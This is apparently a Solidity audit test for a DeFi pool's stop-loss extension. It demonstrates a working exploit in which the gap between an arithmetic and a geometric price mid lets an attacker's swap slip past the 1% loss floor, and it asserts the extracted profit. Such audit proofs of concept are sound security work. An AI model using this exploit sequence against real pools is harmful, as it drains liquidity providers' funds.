// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {MetricOmmPoolBaseTest, Q64} from "@metric-core-test/MetricOmmPool.base.t.sol";
import {BinState} from "@metric-core/types/PoolStorage.sol";
import {ExtensionOrders} from "@metric-core/types/PoolExtensionsConfig.sol";
import {ExtensionOrderTestLib} from "@metric-core-test/ExtensionOrderTestLib.sol";
import {IPriceProvider} from "@metric-core/interfaces/IPriceProvider/IPriceProvider.sol";
import {OracleValueStopLossExtension} from "../../contracts/extensions/OracleValueStopLossExtension.sol";

/// @dev Reproduces PriceProvider two-stage quote composition for a fixed raw 1.00 mark.
contract ComposedBidAskProvider is IPriceProvider {
  uint256 private constant ORACLE_DECIMALS = 1e8;
  uint256 private constant BPS_BASE = 1e18;
  uint256 private constant STEP_DENOM = ORACLE_DECIMALS * BPS_BASE;
  uint256 private constant CONFIDENCE_BASE = 1e10;

  address public immutable baseToken;
  address public immutable quoteToken;
  uint128 internal immutable bid;
  uint128 internal immutable ask;

  constructor(address token0_, address token1_, uint256 oracleSpreadBps, uint256 confidenceParam, uint256 marginStep) {
    baseToken = token0_;
    quoteToken = token1_;

    uint256 rawMid = 1e8;
    uint256 adjustedSpread = oracleSpreadBps * confidenceParam;
    uint256 delta = rawMid * adjustedSpread / CONFIDENCE_BASE;
    uint256 bid8 = rawMid - delta;
    uint256 ask8 = rawMid + delta;
    bid = uint128(Math.mulDiv(bid8, Q64 * (BPS_BASE - marginStep), STEP_DENOM, Math.Rounding.Floor));
    ask = uint128(Math.mulDiv(ask8, Q64 * (BPS_BASE + marginStep), STEP_DENOM, Math.Rounding.Ceil));
  }

  function getBidAndAskPrice() external view returns (uint128, uint128) {
    return (bid, ask);
  }

  function token0() external view returns (address) {
    return baseToken;
  }

  function token1() external view returns (address) {
    return quoteToken;
  }
}

contract OracleValueStopLossMidMismatchAuditTest is MetricOmmPoolBaseTest {
  uint256 private constant E6 = 1e6;
  uint256 private constant METRIC_SCALE = 1e6;
  uint32 private constant DRAWDOWN_E6 = 10_000; // 1%
  uint24 private constant NOTIONAL_FEE_E8 = 50_000; // 0.05%
  uint104 private constant SHARES = 100_000e18;
  OracleValueStopLossExtension internal stopLoss;
  ComposedBidAskProvider internal composedProvider;

  function setUp() public override {
    super.setUp();
    vm.warp(1 days);

    // Use the common 0.01% marginStep from the provider tests. A valid 200 bps
    // observation at the commonly tested confidence gives c = 1%, so the
    // compounded quotes shift the arithmetic mark by only c*m = 0.01 bps.
    composedProvider = new ComposedBidAskProvider(address(token0), address(token1), 200, 500_000, 0.0001e18);

    stopLoss = new OracleValueStopLossExtension(address(this));
    _deployPoolWithStopLoss();
    _approveUsersForPool(address(pool));
    stopLoss.initialize(address(pool), abi.encode(DRAWDOWN_E6, uint32(0), uint32(0)));

    // Bin -1 starts entirely in token1 and executes approximately 1% above the
    // raw oracle mark, allowing the swap size to target the 1% stop-loss floor.
    _addLiquidity(1, -1, -1, SHARES, 0);
  }

  function test_commonParamsShiftedMarkLetsOnePercentLossPass() public {
    (uint128 bid, uint128 ask) = composedProvider.getBidAndAskPrice();
    uint256 arithmeticMid = (uint256(bid) + uint256(ask)) / 2;
    uint256 geometricMid = Math.sqrt(uint256(bid) * uint256(ask));

    emit log_named_decimal_uint("raw oracle mid", Q64, 18);
    emit log_named_decimal_uint("pool geometric mid", geometricMid, 18);
    emit log_named_decimal_uint("extension arithmetic mid", arithmeticMid, 18);

    assertLt(geometricMid, Q64, "geometric pool mid is below the raw mark");
    assertGt(arithmeticMid, Q64, "arithmetic extension mid is above the raw mark");

    // A permissionless dust swap initializes the watermark while leaving effectively
    // all inventory in token1. At this composition, the shifted mark stores a
    // watermark one metric unit below the equivalent raw-oracle metric.
    _swap(0, users[0], true, _i128ExactIn(1e12), 0);
    (uint104 t0Before, uint104 t1Before,,,) = _getBinState(-1);
    uint256 totalShares = _getBinTotalShares(-1);
    (uint256 hwmBefore,) = stopLoss.currentHighWatermarks(address(pool), -1);
    assertGt(hwmBefore, 0, "watermark was primed permissionlessly");

    // Place the transaction immediately across the 1% stop-loss boundary. The
    // tiny mark shift is enough for the production check to accept atomically,
    // while a check at the documented raw oracle mark would revert the full swap.
    uint128 amount1Out = uint128(uint256(t1Before) * 9_862 / 10_000);
    (int256 amount0Delta, int256 amount1Delta) = _swap(2, users[2], true, _i128ExactOut(amount1Out), 0);

    (uint104 t0After, uint104 t1After,,,) = _getBinState(-1);
    (uint256 hwmAfter,) = stopLoss.currentHighWatermarks(address(pool), -1);

    uint256 rawValueBefore = uint256(t0Before) + uint256(t1Before);
    uint256 rawValueAfter = uint256(t0After) + uint256(t1After);
    uint256 rawMetricBefore = _metricToken0(t0Before, t1Before, totalShares, Q64);
    uint256 rawMetricAfter = _metricToken0(t0After, t1After, totalShares, Q64);
    uint256 arithmeticMetricAfter = _metricToken0(t0After, t1After, totalShares, arithmeticMid);
    uint256 rawFloor = Math.mulDiv(rawMetricBefore, E6 - DRAWDOWN_E6, E6);
    uint256 productionFloor = Math.mulDiv(hwmBefore, E6 - DRAWDOWN_E6, E6);

    uint256 token0In = uint256(amount0Delta);
    uint256 token1Out = uint256(-amount1Delta);
    uint256 attackerProfitAtRawMid = token1Out - token0In;

    emit log_named_uint("token0 paid", token0In);
    emit log_named_uint("token1 received", token1Out);
    emit log_named_uint("attacker profit at raw 1:1 mark", attackerProfitAtRawMid);
    emit log_named_uint("raw bin value before", rawValueBefore);
    emit log_named_uint("raw bin value after", rawValueAfter);
    emit log_named_uint("raw metric before", rawMetricBefore);
    emit log_named_uint("raw metric after", rawMetricAfter);
    emit log_named_uint("raw metric stop-loss floor", rawFloor);
    emit log_named_uint("production arithmetic metric after", arithmeticMetricAfter);
    emit log_named_uint("production watermark before", hwmBefore);
    emit log_named_uint("production stop-loss floor", productionFloor);
    emit log_named_uint("production watermark after", hwmAfter);

    assertGt(attackerProfitAtRawMid, 900e18, "attacker extracts material value after the 5 bps fee");
    assertEq(rawMetricBefore, hwmBefore + 1, "shifted mark lowers the initialized watermark by one unit");
    assertLt(
      rawValueAfter * E6, rawValueBefore * (E6 - DRAWDOWN_E6), "raw oracle value falls by more than configured drawdown"
    );
    assertLt(rawMetricAfter, rawFloor, "the extension's integer math at the raw oracle mid would revert");
    assertEq(rawMetricAfter + 1, rawFloor, "raw-oracle control is one unit below its floor");
    assertEq(arithmeticMetricAfter, productionFloor, "production lands exactly on its accepted floor");
    assertGe(hwmAfter, hwmBefore, "the swap succeeds and the production watermark does not fall");
  }

  function _metricToken0(uint104 t0, uint104 t1, uint256 shares, uint256 midX64) private pure returns (uint256) {
    uint256 t0PerShare = Math.mulDiv(uint256(t0), METRIC_SCALE, shares);
    uint256 t1InToken0 = Math.mulDiv(uint256(t1), Q64, midX64);
    return t0PerShare + Math.mulDiv(t1InToken0, METRIC_SCALE, shares);
  }

  function _deployPoolWithStopLoss() private {
    (BinState[] memory nn, BinState[] memory neg) = _defaultBinStateArrays();
    ExtensionOrders memory orders;
    orders.afterSwap = ExtensionOrderTestLib.encodeExtensionOrder(1, 0, 0, 0, 0, 0, 0);

    pool = _deployPoolAndRegister(
      PoolDeployParams({
        priceProvider: address(composedProvider),
        extensions: _singleExtensionPoolExtensions(address(stopLoss)),
        extensionOrders: orders,
        immutablePriceProvider: true,
        protocolSpreadFeeE6: 0,
        adminSpreadFeeE6: 0,
        curBinDistFromProvidedPriceE6: 20_600,
        nonNegativeBinStates: nn,
        negativeBinStates: neg,
        protocolNotionalFeeE8: NOTIONAL_FEE_E8,
        adminNotionalFeeE8: 0,
        immutablePriceProviderForRegistry: address(composedProvider),
        lowestBin: -4,
        highestBin: 4
      })
    );
  }
}
